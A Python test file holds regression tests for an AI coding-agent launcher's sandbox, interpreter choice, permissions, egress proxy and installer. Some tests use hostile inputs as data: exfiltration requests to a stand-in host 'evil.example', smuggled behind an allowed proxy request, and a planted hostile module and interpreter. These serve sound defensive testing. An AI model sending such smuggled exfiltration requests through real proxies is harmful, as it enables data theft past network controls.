"""The defects three independent reviews of the Python port confirmed on 2026-11-15, one test each.

The port was read against pi.bash by three reviewers who were asked for defects they could reproduce,
not opinions: one on the launcher's decisions, one on its processes and network, one on the installer
port. Every test here is one of their reproductions, kept as the thing that must not come back. Where
pi.bash had the same defect (the proxy, the sandbox profile) the test holds the code both share.
"""

import errno
import json
import os
import shutil
import signal
import socket
import stat
import subprocess
import sys
import tempfile
import threading
import time
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "tests"))
sys.path.insert(0, str(ROOT / "python"))
sys.path.insert(0, str(ROOT / "proxy"))

import egress  # noqa: E402
import test_install_fixes as functional  # noqa: E402
from elmboot import agentconfig, installenv  # noqa: E402
from elmpi import cli, console, jail, paths, policy, proxy, relay, state  # noqa: E402

BASE_PATH = "/usr/bin:/bin:/usr/sbin:/sbin"


class Installed(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.base = Path(self.tmp.name).resolve()
        self.fx = functional.Fixture(self.base)

    def launch(self, *args, cwd=None, env=None, record=(), **popen):
        environ = {"PATH": BASE_PATH, "HOME": str(self.fx.home), "TMPDIR": tempfile.gettempdir(),
                   "PI_FORCE": "1", "ELM_PI_NO_PROXY": "1", "ELM_PI_ALLOW_EXTERNAL_MODULES": "1",
                   "RECORD_ENV": " ".join(record)}
        environ.update(env or {})
        result = subprocess.run([str(self.fx.root / "pi"), *args], cwd=cwd or self.fx.project, env=environ,
                                capture_output=True, text=True, timeout=60, **popen)
        result.args_seen = [line[4:] for line in result.stdout.splitlines() if line.startswith("ARG:")]
        result.env_seen = dict(line[4:].split("=", 1) for line in result.stdout.splitlines() if line.startswith("ENV:"))
        return result


class InterpreterChoice(Installed):
    """python/pi, before any Python runs: which interpreter the whole launcher is trusted to."""

    def lose_the_record(self):
        (self.fx.root / "agent/python-path").write_text("/nonexistent/python3\n")

    def test_a_python3_that_does_not_run_is_passed_over_not_run_as_the_launcher(self):
        # a pyenv shim outside its folder: first on PATH, exits 127 with its own message
        self.lose_the_record()
        stubs = self.base / "stubs"
        functional.write(stubs / "python3", "#!/bin/sh\necho 'pyenv: python3: command not found' >&2\nexit 127\n", 0o755)
        r = self.launch("-p", "x", env={"PATH": "%s:%s" % (stubs, BASE_PATH)}, record=("ELM_PI_PYTHON",))
        self.assertEqual((0, ["-p", "x"]), (r.returncode, r.args_seen[-2:]), r.stderr)
        self.assertNotIn("pyenv", r.stderr)

    def test_a_python3_in_the_project_is_never_the_launcher(self):
        # "." or an empty entry on PATH: `command -v python3` found the project's own file
        self.lose_the_record()
        ran = self.fx.project / "ran"
        functional.write(self.fx.project / "python3", "#!/bin/sh\ntouch '%s'\nexit 7\n" % ran, 0o755)
        for path in (".:" + BASE_PATH, ":" + BASE_PATH, BASE_PATH + ":"):
            r = self.launch("--model", "anthropic/claude", "-p", "x", env={"PATH": path})
            self.assertEqual(2, r.returncode, (path, r.stderr))            # the policy ran, and refused
            self.assertIn('model "anthropic/claude" is outside the allowed providers', r.stderr)
            self.assertFalse(ran.exists(), path)

    def test_a_named_interpreter_that_is_a_folder_or_not_runnable_is_refused_in_words(self):
        plain = functional.write(self.base / "notpython", "x\n", 0o644)
        for named in ("/usr/bin", str(plain), "python3", "/nonexistent/python3"):
            r = self.launch("-p", "x", env={"ELM_PI_PYTHON": named})
            self.assertEqual(1, r.returncode, named)
            self.assertEqual("pi: ELM_PI_PYTHON=%s is not a runnable Python (it must be an absolute path)\n" % named,
                             r.stderr)
            self.assertEqual([], r.args_seen)                              # and not started on another one

    def test_a_launcher_that_lost_its_mode_says_so(self):
        (self.fx.root / "python/pi").chmod(0o644)
        r = self.launch("-p", "x")
        self.assertEqual(1, r.returncode)
        self.assertIn("pi: the launcher is not executable: %s" % (self.fx.root / "python/pi"), r.stderr)
        self.assertNotIn("Permission denied", r.stderr)
        self.assertIn("chmod +x pi python/pi pi.orig", (ROOT / "bootstrap.bash").read_text())

    def test_the_researchers_python_variables_reach_the_session(self):
        r = self.launch("-p", "x", env={"PYTHONPATH": "/my/project/src", "PYTHONUSERBASE": "/my/base"},
                        record=("PYTHONPATH", "PYTHONUSERBASE"))
        self.assertEqual(0, r.returncode, r.stderr)
        self.assertEqual({"PYTHONPATH": "/my/project/src", "PYTHONUSERBASE": "/my/base"}, r.env_seen)
        # ... and still cannot reach the launcher: a json.py there is not imported
        hostile = self.base / "hostile"
        functional.write(hostile / "json.py", "raise SystemExit('hostile json imported')\n")
        r = self.launch("--model", "anthropic/claude", "-p", "x", env={"PYTHONPATH": str(hostile)})
        self.assertEqual(2, r.returncode, r.stderr)
        self.assertNotIn("hostile", r.stderr)

    def test_the_installed_launcher_package_is_made_unwritable_like_the_rest(self):
        listed = (ROOT / "lib/sandbox.sh").read_text().split("elm_tighten_install_perms()")[1].split("done")[0]
        self.assertIn(" python ", listed.replace("\\\n", " "))


class LauncherDecisions(Installed):
    def test_a_folder_that_can_be_entered_but_not_read_is_where_the_session_starts(self):
        box = self.fx.project / "dropbox"
        box.mkdir()
        box.chmod(0o300)
        self.addCleanup(box.chmod, 0o700)
        r = self.launch("-p", "x", cwd=box, env={"PI_FORCE": "0"}, record=("PWD",))
        self.assertEqual(0, r.returncode, r.stderr)
        self.assertEqual(str(box), r.env_seen["PWD"])                      # it was the home folder
        self.assertFalse((self.fx.home / ".pi").exists())
        # the function itself leaves the process where it was, readable folder or not
        before = os.getcwd()
        self.assertEqual(os.path.realpath(self.fx.home), paths.kernel_spelling(str(self.fx.home)))
        self.assertEqual(before, os.getcwd())

    def test_an_empty_home_does_not_switch_off_the_home_refusals(self):
        # `cd ~/.ssh; HOME= pi -p x` started a session: "~" had become "/", and nothing is inside "/.ssh".
        import pwd
        from elmpi import untrusted
        real = pwd.getpwuid(os.getuid()).pw_dir
        env = cli.Environment({"ELM_UNTRUSTED_TREE": "~/.ssh", "ELM_UNTRUSTED_EXACT": ""})
        saved = os.environ.get("HOME")
        os.environ["HOME"] = ""
        try:
            self.assertEqual(untrusted.HOME_ITSELF, untrusted.untrusted_folder(real, env))
            self.assertEqual(untrusted.HOME_CONTAINER, untrusted.untrusted_folder(os.path.dirname(real), env))
            self.assertIsNotNone(untrusted.untrusted_folder(real + "/.ssh/keys", env))
            self.assertIsNone(untrusted.untrusted_folder(str(self.fx.project), env))
        finally:
            if saved is None:
                os.environ.pop("HOME", None)
            else:
                os.environ["HOME"] = saved

    def test_home_is_the_accounts_record_when_the_variable_is_no_folder(self):
        import pwd
        real = pwd.getpwuid(os.getuid()).pw_dir
        saved = os.environ.get("HOME")
        try:
            for value in ("", "relative/home"):
                os.environ["HOME"] = value
                self.assertEqual(real, paths.home_dir())
                self.assertEqual(real + "/x", paths.tilde_absolute("~/x"))
            os.environ["HOME"] = "/somewhere/else"
            self.assertEqual("/somewhere/else", paths.home_dir())
        finally:
            if saved is None:
                os.environ.pop("HOME", None)
            else:
                os.environ["HOME"] = saved

    def test_a_comment_in_runtime_env_is_a_comment(self):
        runtime = self.fx.root / "agent/runtime.env"
        original = runtime.read_text()
        runtime.write_text(original + "# old: ELM_ALLOWED_PROVIDERS=anthropic\n")
        r = self.launch("--model", "anthropic/claude", "-p", "x")
        self.assertEqual(2, r.returncode, r.stderr)                        # it set the variable, and let this through
        self.assertEqual([], r.args_seen)
        runtime.write_text("# the install's settings\n" + original)
        r = self.launch("-p", "x")
        self.assertEqual(0, r.returncode, r.stderr)                        # an apostrophe was "No closing quotation"

    def test_closed_streams_are_not_a_traceback(self):
        r = self.launch("-p", "x", preexec_fn=lambda: os.close(0))
        self.assertNotIn("Traceback", r.stderr)
        self.assertEqual((0, ["-p", "x"]), (r.returncode, r.args_seen[-2:]), r.stderr)
        r = subprocess.run("'%s' --help >&-" % (self.fx.root / "pi"), shell=True, cwd=self.fx.project,
                           capture_output=True, text=True, timeout=60,
                           env={"PATH": BASE_PATH, "HOME": str(self.fx.home), "TMPDIR": tempfile.gettempdir()})
        self.assertNotIn("Traceback", r.stderr)
        self.assertFalse(console.is_terminal(None))

    def test_a_nul_byte_in_env_or_runtime_env_is_reported_not_raised(self):
        (self.fx.root / ".env").write_bytes(b"ELM_API_KEY=elm-te\0st\n")
        r = self.launch("-p", "x")
        self.assertNotIn("Traceback", r.stderr)
        self.assertIn("ignoring line 1 of %s - it holds a NUL byte" % (self.fx.root / ".env"), r.stderr)
        self.assertEqual(1, r.returncode)                                  # so there is no key
        (self.fx.root / ".env").write_text("ELM_API_KEY=elm-test\n")
        with open(self.fx.root / "agent/runtime.env", "ab") as handle:
            handle.write(b"export ELM_X='a\0b'\n")
        r = self.launch("-p", "x")
        self.assertNotIn("Traceback", r.stderr)
        self.assertEqual(1, r.returncode)
        self.assertIn("elm-pi runtime configuration is unreadable: it holds a NUL byte", r.stderr)

    def test_a_mistyped_network_mode_is_reported_after_the_model_and_the_key(self):
        bad = {"PI_ELM_NETWORK": "bogus"}
        r = self.launch("--model", "anthropic/x", "-p", "x", env=bad)
        self.assertEqual(2, r.returncode)
        self.assertIn('model "anthropic/x" is outside the allowed providers', r.stderr)
        self.assertNotIn("PI_ELM_NETWORK", r.stderr)
        r = self.launch("-p", "x", env=bad)
        self.assertEqual(2, r.returncode)
        self.assertIn("pi: PI_ELM_NETWORK=bogus is not one of", r.stderr)
        (self.fx.root / ".env").write_text("ELM_API_KEY=\n")
        r = self.launch("-p", "x", env=bad)
        self.assertEqual(1, r.returncode)                                  # was 2, with the network line
        self.assertIn("ELM_API_KEY is not set", r.stderr)

    def test_only_the_six_ascii_spaces_are_trimmed_from_a_provider_or_model(self):
        env = cli.Environment({"ELM_ALLOWED_PROVIDERS": "elm elm-shim", "ELM_QWEN_MODEL_ID": "Qwen/q"})
        for spelling in (" elm", "elm\t", "\n elm-shim \r", "\x0belm\x0c"):
            self.assertTrue(policy.provider_allowed(spelling, env), repr(spelling))
        for spelling in (" elm", "\x1felm", "elm ", "\x85elm"):
            self.assertFalse(policy.provider_allowed(spelling, env), repr(spelling))
            self.assertFalse(policy.model_allowed(spelling + "/x", env), repr(spelling))
        r = self.launch("--provider", "\x1felm", "-p", "x")
        self.assertEqual(2, r.returncode, r.stderr)

    def test_ctrl_c_while_the_launcher_is_working_ends_it_as_a_signal_does(self):
        code = ("import sys; sys.path.insert(0, %r)\n"
                "from elmpi import cli\n"
                "def stop(self): raise KeyboardInterrupt\n"
                "cli.Launcher.run = stop\n"
                "sys.exit(cli.main(['-p', 'x'], install_root=%r))\n" % (str(ROOT / "python"), str(self.fx.root)))
        r = subprocess.run([sys.executable, "-c", code], capture_output=True, text=True, timeout=60)
        self.assertEqual(-signal.SIGINT, r.returncode)
        self.assertEqual("", r.stderr)                                     # was twenty lines of traceback

    def test_what_the_launcher_starts_has_sigpipe_as_a_program_expects_it(self):
        script = "#!/bin/bash\nyes | head -1 >/dev/null\necho \"ARG:${PIPESTATUS[0]}\"\n"
        functional.write(self.fx.root / "pi.orig", script, 0o755)
        functional.write(self.fx.root / "bootstrap.sh", script, 0o755)
        self.assertEqual(["141"], self.launch("-p", "x").args_seen)        # 1, and "Broken pipe", when ignored
        self.assertEqual(["141"], self.launch("setup", "--python").args_seen)
        self.assertEqual(["141"], self.launch("--help").args_seen[-1:])
        sources = "".join((ROOT / "python/elmpi" / name).read_text() for name in ("cli.py", "updates.py"))
        self.assertNotIn("os.execv(", sources)                             # every hand-over goes through launch.hand_over


class SessionState(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.base = Path(self.tmp.name).resolve()

    def test_protecting_transcripts_never_reaches_through_a_link(self):
        victim = self.base / "victim"
        (victim / "dir").mkdir(parents=True)
        tool = functional.write(victim / "tool.sh", "#!/bin/sh\n", 0o755)
        (victim / "dir").chmod(0o755)
        sessions = self.base / "project/.pi/sessions"
        sessions.mkdir(parents=True)
        (sessions / "a.jsonl").symlink_to(tool)
        real = functional.write(sessions / "b.jsonl", "{}\n", 0o644)
        memory = self.base / "agent/projects-memory"
        memory.mkdir(parents=True)
        (memory / "d").symlink_to(victim / "dir")
        (memory / "f").symlink_to(tool)
        state._secure_session_dir(str(sessions))
        state._secure_tree(str(memory))
        self.assertEqual(0o755, stat.S_IMODE(tool.stat().st_mode))         # it lost its exec bit
        self.assertEqual(0o755, stat.S_IMODE((victim / "dir").stat().st_mode))
        self.assertEqual(0o600, stat.S_IMODE(real.stat().st_mode))

    def test_a_new_projects_pi_folder_is_private_all_the_way_down(self):
        project = self.base / "fresh"
        project.mkdir()
        before = os.umask(0o022)
        try:
            state._secure_session_dir(str(project / ".pi/sessions/2026"))
            self.assertEqual(0o022, os.umask(0o022))                        # and the umask is put back
        finally:
            os.umask(before)
        for folder in (".pi", ".pi/sessions", ".pi/sessions/2026"):
            self.assertEqual(0o700, stat.S_IMODE((project / folder).stat().st_mode), folder)


class ProxyProcesses(unittest.TestCase):
    def test_the_proxy_and_its_watchdog_do_not_die_of_the_sessions_ctrl_c(self):
        probe = "import signal; print(signal.getsignal(signal.SIGINT) == signal.SIG_IGN, signal.getsignal(signal.SIGQUIT) == signal.SIG_IGN)"
        out = subprocess.run([sys.executable, "-c", probe], capture_output=True, text=True,
                             preexec_fn=proxy._ignore_keyboard_signals).stdout
        self.assertEqual("True True", out.strip())
        source = (ROOT / "python/elmpi/proxy.py").read_text()
        self.assertIn("preexec_fn=_ignore_keyboard_signals", source.split("def spawn(port):")[1].split("spawn(0)")[0])
        self.assertIn("_ignore_keyboard_signals()", source.split("def _watchdog(")[1])
        # egress.py exits on KeyboardInterrupt, which an ignored SIGINT never raises
        self.assertIn("KeyboardInterrupt", (ROOT / "proxy/egress.py").read_text())


class SandboxProfile(unittest.TestCase):
    """The default mode on macOS. Under the profile as it was, pi's screen could not start."""

    PROBE = r"""
import multiprocessing, os, pty, signal, subprocess, sys, termios, tty
out = {}
def attempt(name, fn):
    try:
        fn(); out[name] = "ok"
    except Exception as problem:
        out[name] = type(problem).__name__
master, slave = pty.openpty()
attempt("raw mode", lambda: tty.setraw(slave))
child = subprocess.Popen(["/bin/sleep", "30"])
attempt("kill a child", lambda: (child.kill(), child.wait(5)))
attempt("semaphore", multiprocessing.Lock)
attempt("pty", pty.openpty)
print(repr(sorted(out.items())))
"""

    def test_the_profile_allows_what_a_terminal_program_needs_and_no_more_network(self):
        text = jail.profile()
        for line in ("(deny default)", "(allow file-ioctl)", "(allow signal (target same-sandbox))",
                     "(allow ipc-posix-sem)", "(allow pseudo-tty)"):
            self.assertIn(line, text)
        self.assertEqual(['(allow network-outbound (remote ip "localhost:*"))'],
                         [line for line in text.splitlines() if "network-outbound" in line])
        self.assertNotIn("(allow signal)", text)                           # its own processes only

    @unittest.skipUnless(sys.platform == "darwin" and os.access(jail.SANDBOX_EXEC, os.X_OK), "macOS's sandbox-exec")
    def test_under_the_real_profile_raw_mode_signals_semaphores_and_ptys_work(self):
        r = subprocess.run([jail.SANDBOX_EXEC, "-p", jail.profile(), sys.executable, "-E", "-S", "-c", self.PROBE],
                           capture_output=True, text=True, timeout=60)
        if "sandbox_apply" in r.stderr:
            self.skipTest("already inside a sandbox, which macOS will not nest")
        self.assertEqual(0, r.returncode, r.stderr)
        self.assertEqual(repr([("kill a child", "ok"), ("pty", "ok"), ("raw mode", "ok"), ("semaphore", "ok")]),
                         r.stdout.strip())
        # and the fence still holds: an address off this machine is refused
        dial = "import socket; socket.create_connection(('192.0.2.1', 9), 3)"
        r = subprocess.run([jail.SANDBOX_EXEC, "-p", jail.profile(), sys.executable, "-E", "-S", "-c", dial],
                           capture_output=True, text=True, timeout=60)
        self.assertNotEqual(0, r.returncode)
        self.assertIn("PermissionError", r.stderr)


class Campus:
    """A fake upstream proxy that answers every request it is sent and keeps what it saw."""

    def __init__(self):
        self.listener = socket.socket()
        self.listener.bind(("127.0.0.1", 0))
        self.listener.listen(8)
        self.port = self.listener.getsockname()[1]
        self.seen = b""
        threading.Thread(target=self.serve, daemon=True).start()

    def serve(self):
        while True:
            try:
                conn, _ = self.listener.accept()
            except OSError:
                return
            threading.Thread(target=self.answer, args=(conn,), daemon=True).start()

    def answer(self, conn):
        # Slow on purpose: it answers once the line has been quiet for a while, so whatever a client
        # sends behind its first request has every chance to arrive here.
        conn.settimeout(1.0)
        got = b""
        try:
            while True:
                data = conn.recv(65536)
                if not data:
                    break
                got += data
                self.seen += data
        except OSError:
            pass
        try:
            for _ in range(max(1, got.count(b" HTTP/1.1\r\n"))):
                conn.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nok")
        except OSError:
            pass
        conn.close()

    def close(self):
        self.listener.close()


class PlainHttpThroughAnUpstream(unittest.TestCase):
    def setUp(self):
        self.campus = Campus()
        self.addCleanup(self.campus.close)
        self.log = tempfile.NamedTemporaryFile(suffix=".log", delete=False)
        self.addCleanup(os.unlink, self.log.name)
        self.proxy = egress.Proxy(["allowed.example"], self.log.name, ("127.0.0.1", self.campus.port))

    def send(self, payload, wait=4):
        ours, theirs = socket.socketpair()
        thread = threading.Thread(target=self.proxy.handle, args=(theirs, ("127.0.0.1", 1)), daemon=True)
        thread.start()
        ours.settimeout(wait)
        got = b""
        for part in payload:
            try:
                ours.sendall(part)
            except OSError:
                break
            time.sleep(0.3)
        try:
            while True:
                data = ours.recv(65536)
                if not data:
                    break
                got += data
        except OSError:
            pass
        ours.close()
        thread.join(5)
        return got

    def test_a_second_request_on_the_connection_never_reaches_the_campus_proxy(self):
        first = b"GET http://allowed.example/ HTTP/1.1\r\nHost: allowed.example\r\nConnection: keep-alive\r\n\r\n"
        got = self.send([first, b"GET http://evil.example/exfil?d=secret HTTP/1.1\r\nHost: evil.example\r\n\r\n",
                         b"CONNECT evil.example:443 HTTP/1.1\r\n\r\n"])
        self.assertEqual(1, got.count(b"200 OK"), got)
        self.assertIn(b"GET http://allowed.example/ HTTP/1.1", self.campus.seen)
        self.assertNotIn(b"evil.example", self.campus.seen)                # it received all three
        self.assertIn(b"Connection: close", self.campus.seen)
        self.assertNotIn(b"keep-alive", self.campus.seen)
        self.assertIn("a second request on a plain-HTTP connection", Path(self.log.name).read_text())

    def test_pipelined_behind_the_first_request_it_is_dropped_too(self):
        both = (b"GET http://allowed.example/ HTTP/1.1\r\nHost: allowed.example\r\n\r\n"
                b"GET http://evil.example/ HTTP/1.1\r\nHost: evil.example\r\n\r\n")
        self.send([both])
        self.assertNotIn(b"evil.example", self.campus.seen)

    def test_a_body_is_forwarded_to_its_declared_length_and_not_a_byte_further(self):
        post = (b"POST http://allowed.example/up HTTP/1.1\r\nHost: allowed.example\r\nContent-Length: 5\r\n\r\nhel")
        got = self.send([post, b"loGET http://evil.example/ HTTP/1.1\r\n\r\n"])
        self.assertIn(b"200 OK", got)
        self.assertTrue(self.campus.seen.endswith(b"\r\n\r\nhello"), self.campus.seen[-60:])
        self.assertEqual(5, egress.one_request_body("POST / HTTP/1.1\r\nContent-Length: 5\r\n\r\n"))
        self.assertEqual(0, egress.one_request_body("GET / HTTP/1.1\r\nHost: a\r\n\r\n"))
        self.assertIsNone(egress.one_request_body("POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\n\r\n"))
        self.assertIsNone(egress.one_request_body("POST / HTTP/1.1\r\nContent-Length: 5, 9\r\n\r\n"))

    def test_a_body_of_unstated_length_is_refused(self):
        got = self.send([b"POST http://allowed.example/up HTTP/1.1\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n"])
        self.assertIn(b"403", got.split(b"\r\n", 1)[0])
        self.assertEqual(b"", self.campus.seen)


class LinuxRelay(unittest.TestCase):
    """The jailed session's only route on Linux. Run here as plain sockets, which is all it is."""

    def test_running_out_of_descriptors_does_not_end_the_relay(self):
        served = []

        class Listener:
            calls = 0

            def accept(self):
                Listener.calls += 1
                if Listener.calls <= 2:
                    raise OSError(errno.EMFILE, "Too many open files")
                if Listener.calls == 3:
                    a, b = socket.socketpair()
                    served.append(b)
                    return a, None
                raise OSError(errno.EBADF, "closed")                        # the listener really has gone

        def connect():
            a, b = socket.socketpair()
            served.append(b)
            return a

        relay.serve(Listener(), connect)
        self.assertEqual(4, Listener.calls)                                # it returned at the first one
        self.assertEqual(2, len(served))
        for sock in served:
            sock.close()

    def test_the_connect_timeout_is_not_left_on_the_tunnel(self):
        listener = socket.socket()
        listener.bind(("127.0.0.1", 0))
        listener.listen(1)
        self.addCleanup(listener.close)
        sock = relay._connect_tcp(listener.getsockname()[1])()
        self.addCleanup(sock.close)
        self.assertIsNone(sock.gettimeout())                               # ten seconds: an upload that paused was cut
        path = os.path.join(tempfile.mkdtemp(dir="/tmp" if os.path.isdir("/tmp") else None), "s")
        self.addCleanup(shutil.rmtree, os.path.dirname(path), True)
        unix = relay._listener_unix(path)
        self.addCleanup(unix.close)
        sock = relay._connect_unix(path)()
        self.addCleanup(sock.close)
        self.assertIsNone(sock.gettimeout())

    def test_a_tmpdir_too_long_for_a_socket_path_is_said_before_anything_starts(self):
        real = shutil.which
        shutil.which = lambda name: "/usr/bin/unshare" if name == "unshare" else real(name)
        self.addCleanup(setattr, shutil, "which", real)
        started = []
        popen = subprocess.Popen
        subprocess.Popen = lambda *a, **k: started.append(a) or (_ for _ in ()).throw(OSError("not in this test"))
        self.addCleanup(setattr, subprocess, "Popen", popen)
        probe = jail._namespace_problem
        jail._namespace_problem = lambda unshare: ""      # this system may not have one to ask
        self.addCleanup(setattr, jail, "_namespace_problem", probe)
        env = cli.Environment({"TMPDIR": "/tmp/" + "x" * 140})
        with self.assertRaises(cli.Refusal) as caught:
            jail._linux(None, env, 40123, sys.executable)
        self.assertIn("TMPDIR is too long for the network jail's socket", caught.exception.lines[0])
        self.assertEqual([], started)


class InstallerPort(unittest.TestCase):
    """python/elmboot: not yet what bootstrap.sh runs, and held to it before it is."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.base = Path(self.tmp.name).resolve()
        self.root = self.base / "install"
        self.root.mkdir()

    def mode(self, path):
        return stat.S_IMODE(os.lstat(path).st_mode)

    def test_tightening_the_install_never_chmods_through_a_link_or_walks_the_transcripts(self):
        secret = functional.write(self.base / "outside-secret", "key\n", 0o600)
        script = functional.write(self.root / "lib/x.sh", "x\n", 0o666)
        (self.root / "lib/link").symlink_to(secret)
        (self.root / ".env").symlink_to(secret)
        transcript = functional.write(self.root / "agent/sessions/t.jsonl", "{}\n", 0o666)
        self.root.chmod(0o777)
        installenv.tighten_install_perms(str(self.root), {})
        self.assertEqual(0o600, self.mode(secret))                         # it became 0755
        self.assertEqual(0o644, self.mode(script))
        self.assertEqual(0o666, self.mode(transcript))                     # not a code tree: left alone, as bash does
        self.assertEqual(0o755, self.mode(self.root))

    def test_a_shared_install_keeps_its_groups_write_access_and_loses_everyone_elses(self):
        script = functional.write(self.root / "lib/x.sh", "x\n", 0o666)
        (self.root / "lib").chmod(0o777)
        installenv.tighten_install_perms(str(self.root), {"ELM_PI_SHARED_STATE": "1"})
        self.assertEqual((0o664, 0o775), (self.mode(script), self.mode(self.root / "lib")))   # were 0646 and 0757

    def prompts(self, manifest, existing=()):
        functional.write(self.root / "templates/prompts/review.md", "---\ndescription: ours\n---\nreview\n")
        functional.write(self.root / "agent/prompts/.elm-pi-managed", manifest)
        for name, text in existing:
            functional.write(self.root / "agent/prompts" / name, text)
        rendered = []
        real = agentconfig.render
        agentconfig.render = lambda root, env, source, destination: rendered.append(destination) or \
            functional.write(self.root / destination, "TEMPLATE\n")
        self.addCleanup(setattr, agentconfig, "render", real)
        agentconfig._prompts(str(self.root), {})
        return rendered

    def test_a_dropped_prompt_already_deleted_and_a_blank_manifest_line_are_not_errors(self):
        self.prompts("dropped.md\n\nreview.md\n", [("review.md", "old template\n")])
        self.assertEqual("TEMPLATE\n", (self.root / "agent/prompts/review.md").read_text())
        self.assertEqual("review.md\n", (self.root / "agent/prompts/.elm-pi-managed").read_text())

    def test_a_prompt_the_researcher_wrote_is_not_replaced_by_a_template_of_the_same_name(self):
        rendered = self.prompts("", [("review.md", "MY OWN /review PROMPT\n")])
        self.assertEqual([], rendered)
        self.assertEqual("MY OWN /review PROMPT\n", (self.root / "agent/prompts/review.md").read_text())
        self.assertEqual("", (self.root / "agent/prompts/.elm-pi-managed").read_text())   # nor claimed as ours

    def test_bootstrap_sh_keeps_such_a_prompt_too(self):
        text = (ROOT / "bootstrap.bash").read_text()
        block = text[text.index("PROMPTS_MANIFEST=agent/prompts/.elm-pi-managed"):text.index("refreshed agent/prompts")]
        work = self.base / "boot"
        functional.write(work / "templates/prompts/review.md", "ours\n")
        functional.write(work / "templates/prompts/plot.md", "ours\n")
        functional.write(work / "agent/prompts/review.md", "MY OWN /review PROMPT\n")
        functional.write(work / "agent/prompts/plot.md", "an older template\n")
        functional.write(work / "agent/prompts/.elm-pi-managed", "plot.md\n")
        script = 'set -eu\nelm_py() { cp "$5" "$6"; }\nCONFIG_TOOL=x HERE=.\n' + block + 'refreshed"\n'
        r = subprocess.run(["bash", "-c", script], cwd=work, capture_output=True, text=True)
        self.assertEqual(0, r.returncode, r.stderr)
        self.assertEqual("MY OWN /review PROMPT\n", (work / "agent/prompts/review.md").read_text())
        self.assertEqual("ours\n", (work / "agent/prompts/plot.md").read_text())           # ours is still refreshed
        self.assertEqual("plot.md\n", (work / "agent/prompts/.elm-pi-managed").read_text())
        self.assertIn("kept your own agent/prompts/review.md", r.stdout)

    def test_an_executable_that_is_not_a_program_is_a_candidate_that_does_not_run(self):
        garbage = self.base / "python3"
        garbage.write_bytes(b"\x00\x01\x02 not a program")
        garbage.chmod(0o755)
        self.assertEqual(1, installenv.python_check(str(garbage)))         # was OSError: Exec format error

    def test_a_path_entry_that_is_a_link_to_condas_bin_is_dropped(self):
        conda = self.base / "miniconda"
        (conda / "bin").mkdir(parents=True)
        (conda / "conda-meta").mkdir()
        (self.base / "links").mkdir()
        (self.base / "links/cbin").symlink_to(conda / "bin")
        self.assertEqual("/usr/bin", installenv.clean_path("%s/links/cbin:/usr/bin" % self.base))

    def test_an_empty_npm_userconfig_override_is_no_override(self):
        env = {"ELM_PI_NPM_USERCONFIG": ""}
        installenv.npm_environment(str(self.root), env)
        self.assertEqual(str(self.root / "config/npmrc"), env["NPM_CONFIG_USERCONFIG"])


class SessionStats(unittest.TestCase):
    TOOL = ROOT / "scripts/session-stats"

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.base = Path(self.tmp.name)

    def session(self, project, name, lines):
        text = b"\n".join(line if isinstance(line, bytes) else json.dumps(line).encode() for line in lines) + b"\n"
        path = self.base / project / ".pi/sessions" / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(text)

    def stats(self, *args, cwd=None):
        return subprocess.run([sys.executable, str(self.TOOL), *args], cwd=cwd or self.base, capture_output=True,
                              text=True, timeout=60)

    def turn(self, stop, tokens=10):
        return {"type": "message", "message": {"role": "assistant", "usage": {"input": tokens, "output": 1},
                                                 "stopReason": stop}}

    def test_two_sessions_of_one_month_have_two_names(self):
        self.session("a", "2026-11-14T14-16-27-314Z_01a1da6a-1111-2222-3333-444444444444.jsonl", [self.turn("stop")])
        self.session("a", "2026-11-14T15-00-00-000Z_9f8e7d6c-1111-2222-3333-444444444444.jsonl", [self.turn("aborted")])
        r = self.stats(str(self.base / "a"))
        self.assertEqual(0, r.returncode, r.stderr)
        self.assertIn("| 01a1da6a |", r.stdout)
        self.assertIn("| 9f8e7d6c |", r.stdout)
        self.assertIn("did not end on stop: 9f8e7d6c", r.stdout)           # both were "2026-11-"

    def test_a_folder_of_projects_is_read_one_level_down(self):
        self.session("one", "s_aaaaaaaa.jsonl", [self.turn("stop")])
        self.session("two", "s_bbbbbbbb.jsonl", [self.turn("stop")])
        r = self.stats()
        self.assertEqual(0, r.returncode, r.stderr)
        self.assertIn("2 session(s), 20 input tokens", r.stdout)

    def test_what_a_killed_session_leaves_does_not_end_the_report(self):
        self.session("a", "s_cccccccc.jsonl", [
            [1, 2], "text", None, {"message": "a string"}, {"message": {"usage": "none"}},
            {"message": {"usage": {"input": "many", "output": None}, "stopReason": 5}},
            b'{"type": "message", "message": {"role": "assistant", "con\xff\xfe',
            b"\xff\xfe not utf-8", self.turn("stop", 7)])
        r = self.stats(str(self.base / "a"))
        self.assertEqual((0, ""), (r.returncode, r.stderr))
        self.assertIn("| cccccccc | 2 | 7 | 7 |", r.stdout)                # the unreadable usage counted as a request of zero
        self.assertIn("every session ended stop", r.stdout)


if __name__ == "__main__":
    unittest.main()
